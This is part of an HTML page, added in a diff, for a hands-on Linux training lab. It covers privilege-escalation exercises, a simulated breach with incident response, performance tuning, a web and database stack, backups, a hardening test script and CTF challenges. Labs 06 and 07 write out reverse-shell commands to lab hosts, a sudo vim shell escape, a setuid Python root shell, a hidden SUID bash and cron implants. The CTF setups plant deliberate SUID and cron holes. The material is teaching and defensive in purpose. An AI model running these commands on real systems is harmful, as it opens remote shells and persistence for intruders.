+setcap cap_setuid=ep /usr/bin/python3.12</div>
+      <div class="ex-task"># Now as alice — find and exploit each one
+sudo vim -c ':!/bin/bash'           # exploit 1
+echo 'bash -i >& /dev/tcp/lab-attacker/4444 0>&1' >> /etc/cron.d/test  # exploit 2
+python3 -c "import os; os.setuid(0); os.system('/bin/bash')"  # exploit 3</div>
+      <div class="ex-verify">✓ VERIFY: After exploitation, fix each misconfiguration. Then re-run exploits and confirm they fail. Document root cause and fix for each.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--g)">
+      <div class="ex-num" style="color:var(--g)">LAB 07 — INCIDENT RESPONSE SIMULATION</div>
+      <div class="ex-title" style="color:var(--g)">Detect, contain, and remediate a simulated breach</div>
+      <div class="ex-body">From lab-attacker, run the breach simulation script. Then on lab-web, perform full IR: find the C2 connection, identify the malware binary, find persistence mechanism, collect forensic evidence, contain, and eradicate.</div>
+      <div class="ex-task"># On lab-attacker: simulate attacker
+nc -lvnp 4444 &    # listen for reverse shell</div>
+      <div class="ex-task"># Run breach on lab-web (as root to simulate post-exploitation)
+bash -c 'bash -i >& /dev/tcp/192.168.100.99/4444 0>&1 &'
+cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden
+echo "* * * * * root /tmp/.hidden -p -c 'id'" > /etc/cron.d/.update</div>
+      <div class="ex-task"># IR: Find the breach on lab-web
+ss -tunp | grep ESTAB | grep -v "192.168.100.[12]"
+ls -la /proc/*/exe 2>/dev/null | grep deleted
+find /tmp /var /etc -newer /etc/passwd -type f 2>/dev/null
+find / -perm -4000 -newer /etc/passwd 2>/dev/null</div>
+      <div class="ex-verify">✓ VERIFY: Document every IoC found. Kill C2 connection. Remove SUID binary. Remove cron implant. Write incident report.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--c)">
+      <div class="ex-num" style="color:var(--c)">LAB 08 — PERFORMANCE ANALYSIS</div>
+      <div class="ex-title" style="color:var(--c)">Diagnose and fix 3 performance issues under load</div>
+      <div class="ex-body">Install stress tools on lab-web. Simulate CPU overload, disk I/O saturation, and memory pressure. Use monitoring tools to identify, diagnose, and remediate each issue. Set cgroup limits to prevent recurrence.</div>
+      <div class="ex-task">apt install -y stress-ng fio sysbench</div>
+      <div class="ex-task"># CPU overload simulation
+stress-ng --cpu 8 --timeout 60s &
+top -bn1 | head -5; vmstat 1 5; ps aux --sort=-%cpu | head -5</div>
+      <div class="ex-task"># Disk I/O saturation
+fio --name=test --rw=write --bs=4k --size=1G --numjobs=4 --runtime=30 &
+iostat -x 1 5; iotop -bn 3 | head -10</div>
+      <div class="ex-task"># Memory pressure
+stress-ng --vm 2 --vm-bytes 80% --timeout 30s &
+free -h; vmstat 1 5 | grep -E "si|so"</div>
+      <div class="ex-task"># Fix: apply cgroup limits
+systemctl set-property stress-ng.service CPUQuota=50% MemoryMax=512M 2>/dev/null || true</div>
+      <div class="ex-verify">✓ VERIFY: For each issue: identify from metrics, name root cause tool, apply fix, show metrics returning to normal.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--y)">
+      <div class="ex-num" style="color:var(--y)">LAB 09 — FULL NGINX + POSTGRESQL STACK</div>
+      <div class="ex-title" style="color:var(--y)">Deploy production web stack with TLS, DB, and monitoring</div>
+      <div class="ex-body">Deploy nginx on lab-web proxying to a Flask app. Set up PostgreSQL on lab-db with a dedicated app user. Configure TLS with self-signed cert. Set up node_exporter on both nodes. Verify end-to-end: curl → nginx → app → postgresql → response.</div>
+      <div class="ex-task"># lab-db: PostgreSQL setup
+apt install -y postgresql-16
+sudo -u postgres psql -c "CREATE DATABASE appdb; CREATE USER appuser WITH PASSWORD 'labpass'; GRANT ALL ON DATABASE appdb TO appuser;"
+sed -i "s/listen_addresses = 'localhost'/listen_addresses = '192.168.100.30'/" /etc/postgresql/16/main/postgresql.conf
+echo "host appdb appuser 192.168.100.20/32 md5" >> /etc/postgresql/16/main/pg_hba.conf
+systemctl restart postgresql</div>
+      <div class="ex-task"># lab-web: nginx TLS config
+openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/lab.key -out /etc/ssl/lab.crt -days 365 -nodes -subj "/CN=lab-web"
+cat > /etc/nginx/sites-enabled/lab << 'EOF'
+server { listen 443 ssl; ssl_certificate /etc/ssl/lab.crt; ssl_certificate_key /etc/ssl/lab.key;
+  location / { proxy_pass http://127.0.0.1:8080; } }
+EOF
+nginx -t && systemctl reload nginx</div>
+      <div class="ex-task"># Verify end-to-end
+curl -k https://lab-web/health
+psql -h 192.168.100.30 -U appuser -d appdb -c "SELECT version();"</div>
+      <div class="ex-verify">✓ VERIFY: curl -k https://lab-web returns 200. psql connects from lab-web to lab-db. Prometheus scrapes metrics from both.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--o)">
+      <div class="ex-num" style="color:var(--o)">LAB 10 — BACKUP, RESTORE & DISASTER RECOVERY</div>
+      <div class="ex-title" style="color:var(--o)">Test your RPO/RTO — can you recover from disaster?</div>
+      <div class="ex-body">Simulate database corruption on lab-db. Time your full recovery: pg_dump restore to a specific point. Then practice file system backup with borg. Finally, simulate complete VM failure and rebuild from scratch using your Ansible playbook.</div>
+      <div class="ex-task"># Create backup BEFORE disaster
+pg_dump -U postgres appdb > /backups/appdb_$(date +%Y%m%d).sql
+borg init --encryption=none /backups/borg-repo
+borg create /backups/borg-repo::lab-$(date +%Y%m%d) /etc /var/www /opt</div>
+      <div class="ex-task"># Simulate disaster
+sudo -u postgres psql -c "DROP DATABASE appdb;"  # database gone!</div>
+      <div class="ex-task"># Time your recovery (RTO measurement)
+time sudo -u postgres psql -c "CREATE DATABASE appdb;"
+time sudo -u postgres psql appdb < /backups/appdb_$(date +%Y%m%d).sql</div>
+      <div class="ex-task"># Verify recovery
+sudo -u postgres psql -d appdb -c "\dt"  # tables should be back</div>
+      <div class="ex-verify">✓ VERIFY: Record your actual RTO. Was it under 5 minutes? What would RPO be if disaster happened 1 hour after last backup?</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PANEL 06 — AUTOMATED TEST SUITE -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🤖</span><span class="pt">Automated Test Suite — Run on Any Lab Node</span><span class="pn">PANEL 06</span></div>
+  <div class="pb">
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">lab_test_suite.sh — automated security & configuration checks</span></div>
+      <div class="tb">
+        <span class="oyn">#!/bin/bash</span>
+        <span class="oyn">## Linux Lab Automated Test Suite</span>
+        <span class="oyn">## Usage: sudo bash lab_test_suite.sh</span>
+        <span class="out">PASS=0; FAIL=0; WARN=0</span>
+        <span class="oyn">check() { local desc=$1 cmd=$2 expected=$3</span>
+        <span class="oyn">  result=$(eval "$cmd" 2>/dev/null)</span>
+        <span class="oyn">  if echo "$result" | grep -q "$expected"; then</span>
+        <span class="ogn">    echo "  ✓ PASS: $desc"; ((PASS++))</span>
+        <span class="oyn">  else</span>
+        <span class="ored">    echo "  ✗ FAIL: $desc (got: $result)"; ((FAIL++))</span>
+        <span class="oyn">  fi; }</span>
+        <span class="oyn">warn() { local desc=$1 cmd=$2 bad=$3</span>
+        <span class="oyn">  result=$(eval "$cmd" 2>/dev/null)</span>
+        <span class="oyn">  if echo "$result" | grep -q "$bad"; then</span>
+        <span class="oyn">    echo "  ⚠ WARN: $desc"; ((WARN++)); fi; }</span>
+
+        <span class="sec">──── IDENTITY CHECKS ────</span>
+        <span class="oyn">echo "=== IDENTITY & ACCESS ==="</span>
+        <span class="oyn">check "Only root has UID 0" \</span>
+        <span class="oyn">  "awk -F: '\$3==0{print \$1}' /etc/passwd | tr '\n' ','" \</span>
+        <span class="oyn">  "^root,$"</span>
+        <span class="oyn">check "No accounts with empty passwords" \</span>
+        <span class="oyn">  "awk -F: '\$2==\"\"{print \$1}' /etc/shadow | wc -l" "^0$"</span>
+        <span class="oyn">warn "NOPASSWD in sudoers" \</span>
+        <span class="oyn">  "grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null" "NOPASSWD"</span>
+        <span class="oyn">check "No MD5 password hashes" \</span>
+        <span class="oyn">  "awk -F: '\$2~/^\\\$1\\\$/{count++}END{print count+0}' /etc/shadow" "^0$"</span>
+
+        <span class="sec">──── SSH CHECKS ────</span>
+        <span class="oyn">echo "=== SSH HARDENING ==="</span>
+        <span class="oyn">check "SSH PermitRootLogin disabled" \</span>
+        <span class="oyn">  "sshd -T | grep permitrootlogin" "no"</span>
+        <span class="oyn">check "SSH PasswordAuthentication disabled" \</span>
+        <span class="oyn">  "sshd -T | grep passwordauthentication" "no"</span>
+        <span class="oyn">check "SSH MaxAuthTries <= 3" \</span>
+        <span class="oyn">  "sshd -T | grep maxauthtries | awk '{print (\$2<=3)?\"ok\":\"fail\"}'" "ok"</span>
+
+        <span class="sec">──── KERNEL & SYSCTL ────</span>
+        <span class="oyn">echo "=== KERNEL HARDENING ==="</span>
+        <span class="oyn">check "ASLR enabled (=2)" \</span>
+        <span class="oyn">  "sysctl -n kernel.randomize_va_space" "2"</span>
+        <span class="oyn">check "dmesg_restrict enabled" \</span>
+        <span class="oyn">  "sysctl -n kernel.dmesg_restrict" "1"</span>
+        <span class="oyn">check "SYN cookies enabled" \</span>
+        <span class="oyn">  "sysctl -n net.ipv4.tcp_syncookies" "1"</span>
+        <span class="oyn">check "rp_filter enabled" \</span>
+        <span class="oyn">  "sysctl -n net.ipv4.conf.all.rp_filter" "1"</span>
+
+        <span class="sec">──── FILESYSTEM ────</span>
+        <span class="oyn">echo "=== FILESYSTEM SECURITY ==="</span>
+        <span class="oyn">SUID_COUNT=$(find / -perm -4000 -not -path '/proc/*' -type f 2>/dev/null | wc -l)</span>
+        <span class="oyn">[ $SUID_COUNT -lt 20 ] && echo "  ✓ PASS: SUID count low ($SUID_COUNT)" && ((PASS++)) \</span>
+        <span class="oyn">  || echo "  ⚠ WARN: High SUID count: $SUID_COUNT" && ((WARN++))</span>
+        <span class="oyn">WWORLD=$(find / -perm -002 -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -type f 2>/dev/null | wc -l)</span>
+        <span class="oyn">[ $WWORLD -eq 0 ] && echo "  ✓ PASS: No world-writable files" && ((PASS++)) \</span>
+        <span class="oyn">  || echo "  ✗ FAIL: $WWORLD world-writable files!" && ((FAIL++))</span>
+
+        <span class="sec">──── SERVICES ────</span>
+        <span class="oyn">echo "=== RUNNING SERVICES ==="</span>
+        <span class="oyn">check "auditd running" "systemctl is-active auditd" "active"</span>
+        <span class="oyn">check "fail2ban running" "systemctl is-active fail2ban" "active"</span>
+        <span class="oyn">warn "Exposed ports on 0.0.0.0 (check these!)" \</span>
+        <span class="oyn">  "ss -tlnp | grep '0\.0\.0\.0' | grep -v ':22 '" "LISTEN"</span>
+
+        <span class="sec">──── SUMMARY ────</span>
+        <span class="oyn">echo ""</span>
+        <span class="oyn">echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>
+        <span class="ogn">echo "  PASS: $PASS"</span>
+        <span class="oyn">echo "  WARN: $WARN"</span>
+        <span class="ored">echo "  FAIL: $FAIL"</span>
+        <span class="oyn">[ $FAIL -eq 0 ] && echo "  STATUS: ✓ SECURE" || echo "  STATUS: ✗ NEEDS WORK"</span>
+        <span class="oyn">echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>
+      </div>
+    </div>
+
+    <!-- Sample output -->
+    <div style="margin-top:12px;font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">Sample Test Run Output</div>
+    <div style="background:var(--bg);border:1px solid var(--b2);padding:14px;font-family:var(--mono);font-size:12px;line-height:1.8">
+      <div style="color:var(--c)">root@lab-web:~# sudo bash lab_test_suite.sh</div>
+      <div style="color:var(--t3)">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+      <div style="color:var(--y)">=== IDENTITY & ACCESS ===</div>
+      <div class="test-row"><div class="test-status ts-pass">✓</div><div><div class="test-name">Only root has UID 0</div><div class="test-cmd">awk -F: '$3==0{print $1}' /etc/passwd → root</div></div></div>
+      <div class="test-row"><div class="test-status ts-pass">✓</div><div><div class="test-name">No accounts with empty passwords</div></div></div>
+      <div class="test-row"><div class="test-status ts-fail">✗</div><div><div class="test-name">NOPASSWD in sudoers — FOUND: alice ALL=(ALL) NOPASSWD:ALL</div><div class="test-cmd">grep -r NOPASSWD /etc/sudoers → match found</div></div></div>
+      <div style="color:var(--y)">=== SSH HARDENING ===</div>
+      <div class="test-row"><div class="test-status ts-pass">✓</div><div><div class="test-name">SSH PermitRootLogin disabled</div></div></div>
+      <div class="test-row"><div class="test-status ts-fail">✗</div><div><div class="test-name">SSH PasswordAuthentication — still enabled!</div><div class="test-cmd">sshd -T | grep passwordauthentication → yes</div></div></div>
+      <div style="color:var(--y)">=== KERNEL HARDENING ===</div>
+      <div class="test-row"><div class="test-status ts-pass">✓</div><div><div class="test-name">ASLR enabled (=2)</div></div></div>
+      <div class="test-row"><div class="test-status ts-pass">✓</div><div><div class="test-name">SYN cookies enabled</div></div></div>
+      <div style="color:var(--y)">=== FILESYSTEM SECURITY ===</div>
+      <div class="test-row"><div class="test-status ts-warn">⚠</div><div><div class="test-name">High SUID count: 24 — audit with find / -perm -4000</div></div></div>
+      <div class="test-row"><div class="test-status ts-fail">✗</div><div><div class="test-name">2 world-writable files found! /etc/cron.d/test /tmp/exploit.sh</div></div></div>
+      <div style="color:var(--t3)">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+      <div style="color:var(--g)">  PASS: 7 &nbsp;&nbsp; <span style="color:var(--y)">WARN: 1</span> &nbsp;&nbsp; <span style="color:var(--r)">FAIL: 3</span></div>
+      <div style="color:var(--r)">  STATUS: ✗ NEEDS WORK — fix the 3 failures above</div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 07 — CTF CHALLENGES -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🚩</span><span class="pt">CTF-Style Challenges — Find the Flag</span><span class="pn">PANEL 07</span></div>
+  <div class="pb">
+    <div class="info"><span style="color:var(--c);flex-shrink:0">ℹ</span><span>Each challenge plants a "flag" string (e.g. <code>FLAG{...}</code>) on the system. You must find it by exploiting the described vulnerability. Solve from a low-privilege user account. <strong style="color:var(--c)">Set up each challenge as root, then switch to 'student' user and solve.</strong></span></div>
+
+    <div class="g2">
+      <div class="ex-card" style="border-left-color:var(--r);margin-bottom:0">
+        <div class="ex-num" style="color:var(--r)">CHALLENGE 01 — SUID ESCAPE</div>
+        <div class="ex-title" style="color:var(--r)">Read /root/flag.txt as unprivileged user</div>
+        <div class="ex-body">Setup (run as root): <code>echo "FLAG{suid_master_$(hostname)}" > /root/flag.txt && chmod 600 /root/flag.txt && cp /usr/bin/find /tmp/find_suid && chmod +s /tmp/find_suid</code></div>
+        <div class="ex-task">Hint: GTFOBins. find has a known SUID escape.</div>
+        <div class="ex-verify">✓ FLAG format: FLAG{suid_master_lab-web}</div>
+      </div>
+      <div class="ex-card" style="border-left-color:var(--o);margin-bottom:0">
+        <div class="ex-num" style="color:var(--o)">CHALLENGE 02 — CRON PRIVESC</div>
+        <div class="ex-title" style="color:var(--o)">Use a misconfigured cron job to escalate</div>
+        <div class="ex-body">Setup: <code>echo "* * * * * root /opt/checker.sh" > /etc/cron.d/check && echo "echo 'ok'" > /opt/checker.sh && chmod 777 /opt/checker.sh</code></div>
+        <div class="ex-task">Hint: You can write to /opt/checker.sh. What runs it? What could you make it do?</div>
+        <div class="ex-verify">✓ Demonstrate you can read /root/flag2.txt via the cron vector</div>
+      </div>
+      <div class="ex-card" style="border-left-color:var(--y);margin-bottom:0">
+        <div class="ex-num" style="color:var(--y)">CHALLENGE 03 — LOG FORENSICS</div>
+        <div class="ex-title" style="color:var(--y)">Find attacker activity in the logs</div>
+        <div class="ex-body">A simulated attacker has run commands on this system. Using only journalctl, auth.log, and auditd logs — find: (1) what time they logged in, (2) what commands they ran as root, (3) what file they created.</div>
+        <div class="ex-task">journalctl --since "1 hour ago" | grep -E "Accepted|sudo|COMMAND"</div>
+        <div class="ex-task">ausearch -k root_cmds -ts "1 hour ago" | grep -E "execve|comm"</div>
+        <div class="ex-verify">✓ Write a 5-line incident summary: who, when, what commands, what was created, what should be done</div>
+      </div>
+      <div class="ex-card" style="border-left-color:var(--c);margin-bottom:0">
+        <div class="ex-num" style="color:var(--c)">CHALLENGE 04 — NETWORK DETECTIVE</div>
+        <div class="ex-title" style="color:var(--c)">Find the hidden C2 connection</div>
+        <div class="ex-body">A process is secretly connecting to an external IP every 30 seconds. Find: which process, which PID, what destination IP and port, what command is it running, and how is it persisted (cron? systemd? bashrc?)</div>
+        <div class="ex-task">ss -tunp | grep -v "192.168.100"</div>
+        <div class="ex-task">lsof -p $(ss -tunp | grep ESTAB | grep -v "192.168.100" | awk '{print $NF}' | grep -oP "pid=\K[0-9]+")</div>
+        <div class="ex-task">cat /proc/PID/cmdline | tr '\0' ' '; cat /proc/PID/environ | tr '\0' '\n' | grep -i ld</div>
+        <div class="ex-verify">✓ Kill the process, remove persistence, and explain how it could have been prevented</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 08 — PROGRESSIVE BUILD LAB -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🏗</span><span class="pt">Progressive Build — Full Enterprise Stack from Zero</span><span class="pn">PANEL 08</span></div>
+  <div class="pb">
+    <div style="display:flex;flex-direction:column">
+      <div class="phase" style="position:relative"><div class="phase-line"></div>
+        <div class="phase-dot">1</div>
+        <div class="phase-body">
+          <div class="phase-title">Deploy Base Infrastructure (2h)</div>
+          <div class="phase-desc">Provision all 5 VMs with Vagrant. Run base provisioning on each. Verify SSH from host to all nodes. Confirm /etc/hosts resolves all hostnames. Take snapshots.</div>
+          <div class="phase-cmd">vagrant up && for h in lab-lb lab-web lab-db lab-monitor; do vagrant ssh $h -c "hostname && ip addr show | grep 192.168"; done</div>
+        </div>
+      </div>
+      <div class="phase" style="position:relative"><div class="phase-line"></div>
+        <div class="phase-dot">2</div>
+        <div class="phase-body">
+          <div class="phase-title">Deploy Application Stack (2h)</div>
+          <div class="phase-desc">Install nginx on lab-web, PostgreSQL on lab-db, configure reverse proxy, set up database with app user, deploy Flask/Django app. Test end-to-end HTTP request → DB query → response.</div>
+          <div class="phase-cmd">curl http://lab-lb/health && psql -h lab-db -U appuser -d appdb -c "SELECT 1"</div>
+        </div>
+      </div>
+      <div class="phase" style="position:relative"><div class="phase-line"></div>
+        <div class="phase-dot">3</div>
+        <div class="phase-body">
+          <div class="phase-title">Security Hardening Pass (2h)</div>
+          <div class="phase-desc">Run lab_test_suite.sh on each node. Fix every FAIL. Configure SELinux/AppArmor. Set up AIDE baseline. Configure auditd. Run lynis on lab-web and get score above 75.</div>
+          <div class="phase-cmd">sudo bash lab_test_suite.sh && lynis audit system | grep "Hardening index"</div>
+        </div>
+      </div>
+      <div class="phase" style="position:relative"><div class="phase-line"></div>
+        <div class="phase-dot">4</div>
+        <div class="phase-body">
+          <div class="phase-title">Deploy Monitoring Stack (2h)</div>
+          <div class="phase-desc">Install node_exporter on all nodes, Prometheus on lab-monitor, Grafana on lab-monitor. Create dashboard for CPU, memory, disk, nginx RPS. Set up alerts for high CPU and service down.</div>
+          <div class="phase-cmd">curl http://lab-monitor:9090/api/v1/targets | python3 -m json.tool | grep health</div>
+        </div>
+      </div>
+      <div class="phase" style="position:relative"><div class="phase-line"></div>
+        <div class="phase-dot">5</div>
+        <div class="phase-body">
+          <div class="phase-title">Red Team Attack & Blue Team Detect (2h)</div>
+          <div class="phase-desc">From lab-attacker: run nmap scan, try SSH brute force, attempt web exploits. From lab-web: watch fail2ban ban the attacker, see auditd capture reconnaissance, verify firewall drops are logged.</div>
+          <div class="phase-cmd">tail -f /var/log/auth.log | grep lab-attacker  # watch from lab-web</div>
+        </div>
+      </div>
+      <div class="phase">
+        <div class="phase-dot">6</div>
+        <div class="phase-body">
+          <div class="phase-title">Backup & Disaster Recovery Test (2h)</div>
+          <div class="phase-desc">Take full borg backup of lab-web config. pg_dump lab-db. Destroy lab-web VM entirely. Rebuild from scratch using Ansible playbook + borg restore. Measure actual RTO.</div>
+          <div class="phase-cmd">time (vagrant destroy lab-web -f && vagrant up lab-web && ansible-playbook -i lab-web, rebuild.yml)</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 09 — QUICK REFERENCE -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">📋</span><span class="pt">Lab Quick Reference — Essential Commands per Step</span><span class="pn">PANEL 09</span></div>
+  <div class="pb">
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">copy-paste cheat sheet — one-liners per topic</span></div>
+      <div class="tb">
+        <span class="sec">──── SYSTEM EXPLORATION (Step 1-2) ────</span>
+        <span class="ogn">uname -a; cat /etc/os-release; lscpu | grep -E "Arch|CPU|Model"; lsmod | head; pstree -p | head -20</span>
+        <span class="sec">──── FILESYSTEM AUDIT (Step 3) ────</span>
+        <span class="ogn">find / -perm -4000 2>/dev/null; find / -perm -002 -not -path '/proc/*' 2>/dev/null | head; df -ih; stat /etc/passwd</span>
+        <span class="sec">──── IAM AUDIT (Step 4) ────</span>
+        <span class="ogn">awk -F: '$3==0' /etc/passwd; awk -F: '$2==""' /etc/shadow; grep -r NOPASSWD /etc/sudoers*; for g in sudo docker disk shadow; do getent group $g; done</span>
+        <span class="sec">──── PROCESS & SERVICE (Step 5) ────</span>
+        <span class="ogn">ps aux | awk '$8~/Z/'; systemctl list-units --state=failed; systemd-analyze blame | head; crontab -l; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v "^#"; done</span>
+        <span class="sec">──── NETWORKING (Step 6) ────</span>
+        <span class="ogn">ss -tlnp; ip route show; ip neigh; nft list ruleset 2>/dev/null; ss -tnp state established | grep -v "192.168.100"</span>
+        <span class="sec">──── SECURITY (Step 7) ────</span>
+        <span class="ogn">lynis audit system --quick 2>&1 | grep -E "Warning|Suggestion"; aide --check 2>&1; dpkg --verify 2>/dev/null | head; ls -la /proc/*/exe 2>/dev/null | grep deleted</span>
+        <span class="sec">──── BOOT (Step 8) ────</span>
+        <span class="ogn">cat /proc/cmdline; systemd-analyze time; systemd-analyze blame | head; efibootmgr -v 2>/dev/null; mokutil --sb-state 2>/dev/null</span>
+        <span class="sec">──── PACKAGES (Step 9) ────</span>
+        <span class="ogn">apt list --upgradable 2>/dev/null | grep security; dpkg --verify 2>/dev/null; grep -r "trusted=yes" /etc/apt/ 2>/dev/null; apt-mark showhold</span>
+        <span class="sec">──── MONITORING (Step 10) ────</span>
+        <span class="ogn">journalctl -p err -b --no-pager | head -20; vmstat 1 3; iostat -x 1 3; lsof | grep deleted; ss -tn state time-wait | wc -l</span>
+        <span class="sec">──── FORENSICS (Steps 7+10) ────</span>
+        <span class="ogn">last -20; lastb | head -10; ausearch -k identity -ts today 2>/dev/null; cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep LD_PRELOAD; find / -newer /etc/passwd -not -path '/proc/*' -type f 2>/dev/null | head -20</span>
+        <span class="sec">──── FULL HEALTH CHECK (30-second system snapshot) ────</span>
+        <span class="ogn">echo "=USERS=" && awk -F: '$3==0' /etc/passwd</span>
+        <span class="ogn">echo "=SUID=" && find / -perm -4000 -not -path '/proc/*' 2>/dev/null | wc -l</span>
+        <span class="ogn">echo "=PORTS=" && ss -tlnp | grep "0.0.0.0"</span>
+        <span class="ogn">echo "=LOAD=" && uptime</span>
+        <span class="ogn">echo "=DISK=" && df -h | awk '$5+0 > 80 {print "HIGH:", $0}'</span>
+        <span class="ogn">echo "=FAILS=" && journalctl -p err -b --no-pager -n 5</span>
+        <span class="ogn">echo "=CRONS=" && for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v "^#" | grep -v "^$" && echo "^^$u"; done</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 10 — COMPLETION -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🏆</span><span class="pt">Lab Completion Criteria — Pass / Fail Standards</span><span class="pn">PANEL 10</span></div>
+  <div class="pb">
+    <div class="g3" style="margin-bottom:14px">
+      <div class="cb cbg">
+        <div class="cbt">Core Competency (Must Pass)</div>
+        <div class="ct" style="font-size:12px;line-height:1.9">
+          <span class="hl">✓</span> lab_test_suite.sh: 0 FAILs on lab-web<br>
+          <span class="hl">✓</span> Lynis score ≥ 75 on lab-web<br>
+          <span class="hl">✓</span> curl https://lab-lb/health returns 200<br>
+          <span class="hl">✓</span> psql connects lab-web → lab-db<br>
+          <span class="hl">✓</span> auditd captures a sudo command<br>
+          <span class="hl">✓</span> fail2ban bans lab-attacker after 5 SSH fails<br>
+          <span class="hl">✓</span> pg_dump restore completes successfully
+        </div>
+      </div>
+      <div class="cb cby">
+        <div class="cbt">Advanced (Aim For)</div>
+        <div class="ct" style="font-size:12px;line-height:1.9">
+          <span class="hy">→</span> Complete all 4 CTF challenges<br>
+          <span class="hy">→</span> Full enterprise stack deployed and monitored<br>
+          <span class="hy">→</span> Complete disaster recovery in under 10 minutes<br>
+          <span class="hy">→</span> All 10 lab exercises documented with findings<br>
+          <span class="hy">→</span> Red team attack detected and blocked before flag<br>
+          <span class="hy">→</span> Ansible playbook that deploys and hardens lab-web from scratch
+        </div>
+      </div>
+      <div class="cb cbr">
+        <div class="cbt">Expert (Stretch Goals)</div>
+        <div class="ct" style="font-size:12px;line-height:1.9">
+          <span class="hr">★</span> SELinux in enforcing mode, 0 AVC denials in steady state<br>
+          <span class="hr">★</span> Full Prometheus alerting fires correctly under load<br>
+          <span class="hr">★</span> HA failover: kill lab-lb, traffic still flows<br>
+          <span class="hr">★</span> LUKS encryption on lab-db data partition<br>
+          <span class="hr">★</span> CI/CD pipeline deploys app from git push to lab-web<br>
+          <span class="hr">★</span> Grafana dashboard visible publicly via nginx reverse proxy
+        </div>
+      </div>
+    </div>
+
+    <div style="background:linear-gradient(135deg,rgba(0,255,136,.1),rgba(0,212,255,.06));border:2px solid rgba(0,255,136,.4);padding:20px 24px;text-align:center">
+      <div style="font-family:var(--sans);font-size:22px;font-weight:700;color:var(--g);margin-bottom:8px">🐧 Lab Complete = Linux Mastered</div>
+      <div style="font-size:12px;color:var(--t2);line-height:1.8;max-width:700px;margin:0 auto">
+        When you can spin up this lab from scratch in under 2 hours, pass all automated tests, exploit and patch the CTF challenges, survive a simulated breach, and recover from disaster — you have achieved <strong style="color:var(--g)">production-grade Linux proficiency</strong>.<br><br>
+        The lab is yours to break and rebuild as many times as you need. <code>vagrant destroy -f && vagrant up</code> gives you a clean slate in minutes.
+      </div>
+      <div style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:14px">
+        <span class="tag tg" style="font-size:12px;padding:5px 12px">🔒 Secure</span>
+        <span class="tag tc" style="font-size:12px;padding:5px 12px">⚡ Performant</span>
+        <span class="tag ty" style="font-size:12px;padding:5px 12px">📊 Monitored</span>
+        <span class="tag tp" style="font-size:12px;padding:5px 12px">🤖 Automated</span>
+        <span class="tag to" style="font-size:12px;padding:5px 12px">💾 Backed Up</span>
+        <span class="tag tr2" style="font-size:12px;padding:5px 12px">🚩 CTF Ready</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div>
+</body>
+</html>
